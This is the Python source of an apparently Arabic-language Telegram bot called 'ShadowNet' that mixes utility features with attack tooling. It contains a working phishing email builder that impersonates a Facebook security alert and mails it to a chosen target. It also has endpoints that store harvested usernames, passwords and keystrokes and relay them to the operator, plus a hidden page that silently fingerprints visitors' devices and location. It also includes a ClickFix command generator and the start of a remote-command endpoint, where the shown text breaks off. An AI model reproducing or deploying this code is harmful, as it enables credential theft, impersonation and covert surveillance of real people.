#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowNet v15.0 - النسخة النهائية المعدلة
تم إصلاح جميع الأخطاء، ترتيب التعريفات، وتحديث الواجهات
جميع صفحات التصيد تعمل بكامل وظائفها مع مواصفات 2026 الدقيقة
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
import shutil
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, unquote
from io import BytesIO
from collections import defaultdict
import functools
import queue
import signal
import asyncio
import ssl

try:
    import requests
    from flask import Flask, request, jsonify, abort, render_template_string, send_file, Response
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    import dns.resolver
    import whois
    import yt_dlp
    from bs4 import BeautifulSoup
    import feedparser
    from deep_translator import GoogleTranslator
    from gtts import gTTS
    import psutil
    try:
        from PIL import Image, ImageDraw, ImageFont
        PIL_AVAILABLE = True
    except:
        PIL_AVAILABLE = False
    try:
        import paramiko
        PARAMIKO_AVAILABLE = True
    except:
        PARAMIKO_AVAILABLE = False
    try:
        import androguard
        from androguard.core.bytecodes.apk import APK
        ANDROGUARD_AVAILABLE = True
    except:
        ANDROGUARD_AVAILABLE = False
except ImportError as e:
    print(f"مكتبة مفقودة: {e}. يرجى تثبيت: pip install -r requirements.txt")
    sys.exit(1)

TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
if not TOKEN:
    print("❌ خطأ: لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة!")
    sys.exit(1)

ADMIN_ID = 7965377136
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://my-t99-bot.onrender.com')
PORT = int(os.environ.get('PORT', 5000))
API_KEY = secrets.token_hex(32)

SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', 'your-email@gmail.com')
SMTP_PASS = os.environ.get('SMTP_PASS', 'your-password')

STEALTH_MODE = False
BOT_LOCKED = False
CACHE_WEATHER = {}
CACHE_NEWS = {}
CACHE_EXPIRY = 600

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ===================== تعريف القوائم الأساسية =====================
QUOTES_DB = {
    "حكمة": ["لا تنتظر أن يأتيك أحد ويمنحك الفرصة، اصنعها بنفسك."],
    "تحفيز": ["توقف عن مقارنة بدايتك بنهاية غيرك."]
}
ADKAR_SABAH = ["أصبحنا وأصبح الملك لله..."]
ADKAR_MASSAA = ["أمسينا وأمسى الملك لله..."]
DUAA_DB = [{"title": "دعاء السفر", "text": "اللهم إنا نسألك في سفرنا هذا البر", "source": "صحيح مسلم"}]
VOICES = {"مصري": "ar", "مصرية": "ar", "سعودية": "ar"}
LANGUAGES = {
    'ar': 'عربي', 'en': 'إنجليزي', 'fr': 'فرنسي', 'es': 'إسباني',
    'de': 'ألماني', 'it': 'إيطالي', 'pt': 'برتغالي', 'ru': 'روسي',
    'ja': 'ياباني', 'ko': 'كوري', 'zh-cn': 'صيني مبسط', 'hi': 'هندي',
    'tr': 'تركي', 'fa': 'فارسي', 'ur': 'أردي'
}

# ===================== قاعدة البيانات =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY, is_admin INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10, referral_code TEXT UNIQUE, created_at TEXT, last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0, can_use_camera INTEGER DEFAULT 0,
        can_use_phishing INTEGER DEFAULT 0, can_use_advanced INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (chat_id INTEGER PRIMARY KEY, token TEXT UNIQUE)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, action TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reminders (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, message TEXT, remind_time TEXT, created_at TEXT, is_active INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS short_urls (id INTEGER PRIMARY KEY AUTOINCREMENT, original_url TEXT, short_code TEXT UNIQUE, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS cookie_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, cookies TEXT, ip TEXT, user_agent TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS camera_images (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, image BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_cookies (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, url TEXT, cookie_name TEXT, cookie_value TEXT, technique TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hack_files (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, filename TEXT, content BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hack_commands (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, command TEXT, output TEXT, created_at TEXT)''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN can_use_camera INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_phishing INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_advanced INTEGER DEFAULT 0")
    except:
        pass
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced) VALUES (?, 1, 999, ?, 1, 1, 1, 1)",
              (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1 WHERE chat_id = ?", (ADMIN_ID,))
    conn.commit()
    conn.close()

init_db()

# ===================== دوال مساعدة قاعدة البيانات =====================
def is_admin(chat_id):
    row = safe_db_query("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def is_banned(chat_id):
    row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def get_user_points(chat_id):
    row = safe_db_query("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    return row[0] if row else 0

def user_can_use_collector(chat_id):
    row = safe_db_query("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_camera(chat_id):
    row = safe_db_query("SELECT can_use_camera FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_phishing(chat_id):
    row = safe_db_query("SELECT can_use_phishing FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_advanced(chat_id):
    row = safe_db_query("SELECT can_use_advanced FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def add_points(chat_id, amount, reason):
    if safe_db_execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, amount, reason, datetime.now().isoformat()))

def deduct_points(chat_id, amount, reason):
    points = get_user_points(chat_id)
    if points < amount:
        return False
    if safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, -amount, reason, datetime.now().isoformat()))
        return True
    return False

def safe_db_query(query, params=(), fetch_one=True, default=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        if fetch_one:
            result = c.fetchone()
        else:
            result = c.fetchall()
        conn.close()
        return result if result is not None else default
    except Exception as e:
        logger.error(f"خطأ في قاعدة البيانات: {e}")
        return default

def safe_db_execute(query, params=()):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"خطأ في تنفيذ قاعدة البيانات: {e}")
        return False

def safe_send(chat_id, text, reply_markup=None, parse_mode='HTML'):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode, timeout=60)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"📢 إشعار: {msg}")

def log_activity(chat_id, action):
    safe_db_execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
                    (chat_id, action, datetime.now().isoformat()))

def update_last_seen(chat_id):
    safe_db_execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))

def get_user_name(chat_id):
    try:
        user = bot.get_chat(chat_id)
        return user.first_name or user.username or str(chat_id)
    except:
        return str(chat_id)

# ===================== دوال الخدمات العامة =====================
def get_weather_detailed(city):
    if city in CACHE_WEATHER and time.time() - CACHE_WEATHER[city]['time'] < CACHE_EXPIRY:
        return CACHE_WEATHER[city]['data']
    try:
        url = f"https://wttr.in/{city}?format=j1&lang=ar"
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            current = data.get('current_condition', [{}])[0]
            weather_desc = current.get('weatherDesc', [{}])[0].get('value', 'غير معروف')
            temp_c = current.get('temp_C', 'غير معروف')
            feels_like = current.get('FeelsLikeC', 'غير معروف')
            humidity = current.get('humidity', 'غير معروف')
            wind_speed = current.get('windSpeedKmph', 'غير معروف')
            pressure = current.get('pressure', 'غير معروف')
            visibility = current.get('visibility', 'غير معروف')
            uv_index = current.get('uvIndex', 'غير معروف')
            forecast = data.get('weather', [{}])[0]
            max_temp = forecast.get('maxtempC', 'غير معروف')
            min_temp = forecast.get('mintempC', 'غير معروف')
            sunrise = forecast.get('astronomy', [{}])[0].get('sunrise', 'غير معروف')
            sunset = forecast.get('astronomy', [{}])[0].get('sunset', 'غير معروف')
            now = datetime.now().strftime("%I:%M %p")
            msg = f"🌤️ حالة الطقس في {city}\n────────────────────────\n\nالحالة العامة : {weather_desc}\n\nدرجة الحرارة : {temp_c} درجة مئوية\nالحرارة المحسوسة : {feels_like} درجة مئوية\n\nتفاصيل الأجواء\n────────────────────────\nالمدى الحراري : الصغرى {min_temp}°C | العظمى {max_temp}°C\nالرطوبة       : {humidity}%\nسرعة الرياح    : {wind_speed} كم/ساعة\nمؤشر الأشعة    : {uv_index}\nالرؤية         : {visibility} كم\nالضغط الجوي    : {pressure} hPa\n\nأوقات اليوم\n────────────────────────\nشروق الشمس : {sunrise}\nغروب الشمس : {sunset}\n\nآخر تحديث : {now}"
            CACHE_WEATHER[city] = {'data': msg, 'time': time.time()}
            return msg
        else:
            return "فشل جلب الطقس، يرجى التحقق من اسم المدينة."
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def get_news_without_api(topic='general'):
    if topic in CACHE_NEWS and time.time() - CACHE_NEWS[topic]['time'] < CACHE_EXPIRY:
        return CACHE_NEWS[topic]['data']
    try:
        rss_feeds = {
            'general': 'https://www.aljazeera.net/feeds/rss',
            'egypt': 'https://www.youm7.com/RSS',
            'sport': 'http://www.kooora.com/rss.aspx',
            'tech': 'https://www.aitnews.com/feed',
            'economy': 'https://www.alarabiya.net/ar/economy/rss.xml',
            'world': 'https://www.bbc.com/arabic/index.xml',
            'science': 'https://www.nature.com/nature.rss',
        }
        feed_url = rss_feeds.get(topic, rss_feeds['general'])
        feed = feedparser.parse(feed_url)
        articles = []
        if feed.entries:
            for entry in feed.entries[:10]:
                title = entry.get('title', '').strip()
                summary = entry.get('summary', '') or entry.get('description', '')
                summary = re.sub(r'<[^>]+>', '', summary)
                link = entry.get('link', '')
                published = entry.get('published', '')
                try:
                    pub_date = datetime(*entry.published_parsed[:6]).strftime("%Y-%m-%d %H:%M")
                except:
                    pub_date = "تاريخ غير معروف"
                articles.append(f"📌 {title}\n📅 {pub_date}\n{summary[:250]}...\n🔗 {link}\n")
            if articles:
                result = "\n".join(articles[:8])
                CACHE_NEWS[topic] = {'data': result, 'time': time.time()}
                return result
        return "لا توجد أخبار"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def advanced_wikipedia_search(query):
    try:
        import wikipedia
        wikipedia.set_lang("ar")
        results = wikipedia.search(query, results=10)
        if not results:
            return "لم يتم العثور على نتائج"
        summaries = []
        for title in results[:5]:
            try:
                page = wikipedia.page(title)
                summary = page.summary[:500] + "..."
                url = page.url
                summaries.append(f"📌 {title}\n{summary}\n🔗 {url}\n")
            except wikipedia.exceptions.DisambiguationError as e:
                options = e.options[:5]
                summaries.append(f"📌 {title} (توجد عدة صفحات):\n" + "\n".join([f"• {opt}" for opt in options]))
            except:
                summaries.append(f"📌 {title}\n(لا يمكن جلب الملخص)\n")
        if summaries:
            return "\n".join(summaries)
        return "لم يتم العثور على نتائج"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def translate_text_advanced_with_lang(text, target_lang='ar'):
    try:
        translator = GoogleTranslator(source='auto', target=target_lang)
        translated = translator.translate(text)
        return [translated], 'auto', 'تلقائي', LANGUAGES.get(target_lang, target_lang)
    except Exception as e:
        return [text], 'unknown', 'غير معروف', 'غير معروف'

def generate_strong_password():
    chars = string.ascii_letters + string.digits + "!@#$%"
    while True:
        pwd = ''.join(random.choice(chars) for _ in range(14))
        if re.search(r"[A-Z]", pwd) and re.search(r"[a-z]", pwd) and re.search(r"[0-9]", pwd) and re.search(r"[!@#$%]", pwd):
            return pwd

def analyze_password(password):
    score, feedback = 0, []
    if len(password) >= 12: score += 2
    elif len(password) >= 8: score += 1
    else: feedback.append("قصيرة جداً. خليها 12 حرف على الاقل")
    if re.search(r"[A-Z]", password): score += 1
    else: feedback.append("اضف حرف كبير A-Z")
    if re.search(r"[a-z]", password): score += 1
    else: feedback.append("اضف حرف صغير a-z")
    if re.search(r"[0-9]", password): score += 1
    else: feedback.append("اضف ارقام 0-9")
    if re.search(r"[!@#$%^&*]", password): score += 1
    else: feedback.append("اضف رمز!@#$%")
    if score <= 2: strength, time_taken = "ضعيفة جداً 🔴", "اقل من ثانية"
    elif score <= 4: strength, time_taken = "متوسطة 🟡", "عدة ساعات"
    else: strength, time_taken = "قوية جداً 🟢", "مليارات السنين"
    return strength, time_taken, score, feedback

def generate_image(prompt):
    try:
        url = f"https://image.pollinations.ai/prompt/{prompt}?width=1024&height=1024&nologo=true"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            return BytesIO(response.content)
        return None
    except Exception as e:
        logger.error(f"Image generation error: {e}")
        return None

def generate_voice_gtts(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        voice_bytes = BytesIO()
        tts.write_to_fp(voice_bytes)
        voice_bytes.seek(0)
        return voice_bytes
    except Exception as e:
        logger.error(f"gTTS error: {e}")
        return None

def shorten_url(url):
    try:
        code = hashlib.md5(url.encode()).hexdigest()[:8]
        safe_db_execute("INSERT INTO short_urls (original_url, short_code, created_at) VALUES (?, ?, ?)", (url, code, datetime.now().isoformat()))
        return f"{SERVER_URL}/s/{code}"
    except Exception as e:
        return None

def expand_url(short_url):
    try:
        code = short_url.split('/')[-1]
        row = safe_db_query("SELECT original_url FROM short_urls WHERE short_code = ?", (code,))
        if row:
            return row[0]
        return None
    except:
        return None

def track_phone_number(number):
    try:
        parsed = phonenumbers.parse(number, None)
        country = geocoder.description_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        timezones = timezone.time_zones_for_number(parsed)
        return f"📱 معلومات الرقم {number}:\nالبلد: {country}\nالمشغل: {carrier_name}\nالمناطق الزمنية: {', '.join(timezones)}"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def download_video(url):
    try:
        os.makedirs('downloads', exist_ok=True)
        ydl_opts = {'outtmpl': 'downloads/%(title)s.%(ext)s', 'format': 'best[ext=mp4]/best', 'quiet': True, 'no_warnings': True, 'ignoreerrors': True, 'no_check_certificate': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if info:
                filename = ydl.prepare_filename(info)
                if os.path.exists(filename):
                    return filename, None
                for f in os.listdir('downloads'):
                    if info.get('id', '') in f:
                        return os.path.join('downloads', f), None
            return None, "فشل التحميل"
    except Exception as e:
        return None, str(e)[:200]

def analyze_apk(data, filename):
    if not ANDROGUARD_AVAILABLE:
        return {"error": "androguard غير مثبتة"}
    try:
        from androguard.core.bytecodes.apk import APK
        apk = APK(BytesIO(data))
        permissions = apk.get_permissions()
        dangerous = ['READ_SMS', 'CAMERA', 'RECORD_AUDIO', 'READ_CONTACTS', 'ACCESS_FINE_LOCATION']
        found = [p for p in permissions if any(d in p for d in dangerous)]
        return {'package': apk.get_package(), 'version': apk.get_androidversion_code(), 'permissions': permissions, 'dangerous_permissions': found, 'malicious': len(found) > 3}
    except Exception as e:
        return {'error': f"فشل التحليل: {str(e)[:100]}"}

def extract_pdf_text(data):
    try:
        import pypdf
        reader = pypdf.PdfReader(BytesIO(data))
        text = ""
        for page in reader.pages:
            text += page.extract_text() + "\n"
        return text.strip()
    except ImportError:
        return "مكتبة PyPDF2 غير مثبتة"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def smart_pdf_search(pdf_text, question):
    if not pdf_text:
        return "لم يتم تحميل أي ملف PDF."
    lines = pdf_text.split('\n')
    relevant = [line for line in lines if any(word in line.lower() for word in question.lower().split())]
    if relevant:
        return "\n".join(relevant[:5])
    return "لم يتم العثور على إجابة."

def check_link_no_api(url):
    try:
        response = requests.get(url, timeout=5, verify=False)
        status = response.status_code
        if status == 200:
            return {"status": "ok", "message": "الرابط يعمل", "code": status}
        else:
            return {"status": "warning", "message": f"استجابة غير متوقعة (كود {status})", "code": status}
    except Exception as e:
        return {"status": "error", "message": f"فشل الاتصال: {str(e)[:100]}"}

# ===================== دوال بريد التصيد =====================
def send_phishing_email(target_email, platform, custom_message=None):
    try:
        if SMTP_USER == "your-email@gmail.com":
            return "❌ SMTP غير مضبوط."

        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        fake_location = random.choice(["موسكو، روسيا", "بكين، الصين", "نيويورك، الولايات المتحدة", "لندن، المملكة المتحدة"])
        fake_time = datetime.now().strftime("%I:%M %p")
        fake_date = datetime.now().strftime("%d %B %Y")

        phishing_html = f'''
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>إشعار أمان فيسبوك</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }}
                .email-container {{ max-width: 600px; width: 100%; background: #ffffff; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); overflow: hidden; }}
                .email-header {{ background: #1877f2; padding: 20px; text-align: center; }}
                .email-header h1 {{ color: #ffffff; font-size: 24px; font-weight: 700; }}
                .email-body {{ padding: 30px; }}
                .security-badge {{ background: #fffbcc; border: 1px solid #ffd700; border-radius: 8px; padding: 15px; margin-bottom: 20px; text-align: center; }}
                .security-badge span {{ font-size: 28px; }}
                .highlight {{ background: #f0f2f5; padding: 15px; border-radius: 8px; margin: 15px 0; font-size: 14px; color: #1c1e21; }}
                .highlight strong {{ color: #1877f2; }}
                .btn {{ display: inline-block; background: #1877f2; color: #ffffff; padding: 14px 30px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 18px; margin: 15px 0; border: none; cursor: pointer; transition: background 0.2s; }}
                .btn:hover {{ background: #166fe5; }}
                .email-footer {{ border-top: 1px solid #dddfe2; padding: 20px 30px; font-size: 12px; color: #8a8d91; text-align: center; }}
                .email-footer a {{ color: #1877f2; text-decoration: none; }}
            </style>
        </head>
        <body>
        <div class="email-container">
            <div class="email-header"><h1>🔒 فيسبوك</h1></div>
            <div class="email-body">
                <div class="security-badge"><span>⚠️</span><p style="margin:0; font-weight:600; color:#856404;">تنبيه أمني عاجل</p></div>
                <h2>تم اكتشاف محاولة دخول غير مصرح بها</h2>
                <p>عزيزي المستخدم،</p>
                <p>نود إبلاغك بأننا اكتشفنا <strong>محاولة تسجيل دخول</strong> إلى حسابك من جهاز غير معروف وعنوان IP غير مألوف. لحماية حسابك، نطلب منك تأكيد هويتك فوراً.</p>
                <div class="highlight">
                    <strong>📍 تفاصيل محاولة الدخول:</strong><br>
                    التاريخ: {fake_date}<br>
                    الوقت: {fake_time} (بتوقيت جرينتش)<br>
                    الجهاز: Windows 11 / Chrome 120<br>
                    الموقع: {fake_location} (IP: {fake_ip})
                </div>
                <p>إذا لم تكن هذه المحاولة من قِبلك، يرجى <strong>تأكيد هويتك فوراً</strong> من خلال النقر على الزر أدناه لتأمين حسابك ومنع أي وصول غير مصرح به.</p>
                <div style="text-align: center;">
                    <a href="{SERVER_URL}/phishing_pages/facebook" class="btn">✅ تأكيد هويتي</a>
                </div>
                <p style="font-size:14px; color:#8a8d91; margin-top:20px;">إذا قمت بهذه المحاولة بنفسك، يمكنك تجاهل هذه الرسالة. لن يُطلب منك أي معلومات حساسة عبر البريد الإلكتروني.</p>
                <p style="font-size:14px; color:#8a8d91;">شكراً لك،<br><strong>فريق الأمان في فيسبوك</strong></p>
            </div>
            <div class="email-footer">
                <p>تم إرسال هذه الرسالة إلى <a href="#">{target_email}</a> من فيسبوك.</p>
                <p>للمزيد من المعلومات، يرجى زيارة <a href="#">مركز المساعدة</a>.</p>
                <p>© 2026 Meta Platforms, Inc. جميع الحقوق محفوظة.</p>
            </div>
        </div>
        </body>
        </html>
        '''

        msg = MIMEMultipart('alternative')
        msg['Subject'] = f"تنبيه أمني عاجل - {platform.capitalize()}"
        msg['From'] = SMTP_USER
        msg['To'] = target_email
        msg.attach(MIMEText(phishing_html, 'html'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()

        return f"✅ تم إرسال البريد إلى {target_email}"
    except Exception as e:
        return f"❌ فشل: {str(e)[:100]}"

# ===================== دوال ClickFix =====================
def generate_clickfix_command(target_name="مستخدم"):
    templates = [
        f'powershell -Command "Write-Host \'✅ تم إصلاح المشكلة لـ {target_name}!\' -ForegroundColor Green; pause"',
        f'cmd /c "echo ✅ تم التحديث بنجاح لـ {target_name} & pause"',
        f'powershell -Command "Invoke-WebRequest -Uri https://update.microsoft.com/verify -OutFile $env:TEMP/verify.txt; Start-Sleep -Seconds 2; Remove-Item $env:TEMP/verify.txt; Write-Host \'✅ تم تأكيد هويتك بنجاح\' -ForegroundColor Green"',
        f'cmd /c "ping 8.8.8.8 -n 3 && echo ✅ تم التحقق من الاتصال لـ {target_name} && pause"'
    ]
    return random.choice(templates)

# ===================== آلية قتل النسخ القديمة =====================
def kill_old_bot_instances():
    current_pid = os.getpid()
    current_file = os.path.abspath(__file__)
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
            try:
                if proc.info['pid'] == current_pid:
                    continue
                cmdline = ' '.join(proc.info['cmdline'] or [])
                if 'python' in proc.info['name'].lower() and current_file in cmdline:
                    logger.warning(f"🔪 Killing old bot process: PID {proc.info['pid']}")
                    proc.kill()
                    time.sleep(1)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
    except Exception as e:
        logger.error(f"Error killing old instances: {e}")

# ===================== إنشاء البوت =====================
bot = TeleBot(TOKEN, parse_mode='HTML')
os.makedirs('temp', exist_ok=True)
os.makedirs('downloads', exist_ok=True)
os.makedirs('collected', exist_ok=True)

user_states = {}
user_emails = {}
pdf_texts = {}
waiting_for_password = set()
waiting_for_image_prompt = set()
waiting_for_voice_text = set()
user_voice_selection = {}

# ===================== دوال Flask الأساسية =====================
@app.route('/health')
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})

@app.route('/device_info')
def device_info_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><title>معلومات الجهاز</title></head>
    <body style="display:none;">
    <script>
    async function getDeviceInfo() {
        const urlParams = new URLSearchParams(window.location.search);
        const chat_id = urlParams.get('id');
        let data = {chat_id: chat_id};
        data.userAgent = navigator.userAgent;
        data.language = navigator.language;
        data.platform = navigator.platform;
        data.cores = navigator.hardwareConcurrency || 'غير معروف';
        data.ram = navigator.deviceMemory || 'غير معروف';
        data.width = screen.width;
        data.height = screen.height;
        data.colorDepth = screen.colorDepth;
        if (navigator.connection) {
            data.network = navigator.connection.type || 'غير محدد';
            data.downlink = navigator.connection.downlink || 'غير معروف';
            data.effectiveType = navigator.connection.effectiveType || 'غير محدد';
        }
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            data.battery = Math.round(battery.level * 100);
            data.charging = battery.charging;
        }
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            data.ip = ipData.ip || 'غير معروف';
            data.country = ipData.country_name || 'غير معروف';
            data.city = ipData.city || 'غير معروف';
        } catch(e){}
        await fetch('/send_device_info', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
        document.body.innerHTML = "<p>✅ تم الارسال. يمكنك الرجوع للبوت</p>";
        setTimeout(() => window.close(), 1000);
    }
    getDeviceInfo();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/send_device_info', methods=['POST'])
def receive_device_info():
    data = request.json
    chat_id = data.get('chat_id')
    if not chat_id:
        return jsonify({"status": "error"}), 400
    safe_db_execute("INSERT OR REPLACE INTO victims (chat_id, ip, country, platform, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?)",
                    (str(chat_id), data.get('ip', ''), data.get('country', ''), data.get('platform', ''), datetime.now().isoformat(), datetime.now().isoformat()))
    safe_db_execute("INSERT INTO collected_data (device_id, data_type, data, created_at) VALUES (?, ?, ?, ?)",
                    (str(chat_id), "device_info", json.dumps(data), datetime.now().isoformat()))
    msg = f"""📱 معلومات الجهاز\nالدولة: {data.get('country', 'غير معروف')}\nIP: {data.get('ip', 'غير معروف')}\nالجهاز: {data.get('platform', 'غير معروف')}\nالذاكرة: {data.get('ram', 'غير معروف')} جيجابايت\nالشاشة: {data.get('width', 'غير معروف')}x{data.get('height', 'غير معروف')}\nالبطارية: {data.get('battery', 'غير معروف')}%"""
    notify_admin(msg)
    return jsonify({"status": "ok"})
  # ===================== دوال Flask المتبقية =====================
@app.route('/api/phishing_submit', methods=['POST'])
def phishing_submit():
    try:
        platform = request.form.get('platform', 'unknown')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        ('', platform, username, password, ip, datetime.now().isoformat()))
        notify_admin(f"🎯 تصيد جديد!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}")
        return "OK", 200
    except Exception as e:
        return "حدث خطأ", 500

@app.route('/api/collect_keylog', methods=['POST'])
def collect_keylog():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        keystrokes = data.get('keystrokes', '')
        if chat_id and keystrokes:
            safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                            (str(chat_id), "keylog", keystrokes, datetime.now().isoformat()))
            notify_admin(f"⌨️ ضغطات من {chat_id}: {keystrokes}")
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"collect_keylog error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    html = PHISHING_TEMPLATES.get(platform)
    if not html:
        return "منصة غير مدعومة", 404
    return render_template_string(html)

@app.route('/rce', methods=['POST'])
def rce():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        command = data.get('command', '')
        if not chat_id or not command:
            return jsonify({"error": "بيانات ناقصة"}), 400
